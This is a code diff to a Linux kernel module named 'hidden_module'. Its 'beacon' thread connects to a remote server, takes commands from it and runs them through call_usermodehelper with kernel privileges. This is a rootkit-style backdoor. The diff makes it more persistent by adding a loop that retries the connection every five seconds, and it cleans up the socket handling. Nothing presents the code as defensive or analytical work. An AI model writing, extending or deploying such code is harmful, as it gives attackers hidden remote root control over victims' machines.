@@ -111,7 +111,13 @@ static int beacon_main(void *data) {
     char recv_buf[BUF_SIZE];
     int len;
 
-    if (connect_to_server() < 0) return 0;
+    // Retry loop until connection is successful
+    while (!kthread_should_stop()) {
+        if (connect_to_server() == 0) break;
+        msleep(5000);  // Wait 5 seconds before retrying
+    }
+
+    printk(KERN_INFO "[beacon] Connected to server\n");
 
     while (!kthread_should_stop()) {
         memset(recv_buf, 0, BUF_SIZE);
@@ -122,10 +128,7 @@ static int beacon_main(void *data) {
         if (len > 0) {
             recv_buf[len] = '\0';
             printk(KERN_INFO "[beacon] Got command: %s\n", recv_buf);
-
-            // Build argument array for shell
             argv[2] = recv_buf;
-
             call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
         }
 
@@ -157,11 +160,14 @@ static void __exit hidden_exit(void) {
     if (beacon_thread)
         kthread_stop(beacon_thread);
 
-    if (conn_socket)
-        sock_release(conn_socket);
+    if (conn_socket) {
+        sock_release(conn_socket);  // Sends TCP FIN or RST
+        conn_socket = NULL;
+    }
 
     printk(KERN_INFO "[hidden_module] Goodbye!\n");
 }
+
 
 module_init(hidden_init);
 module_exit(hidden_exit);
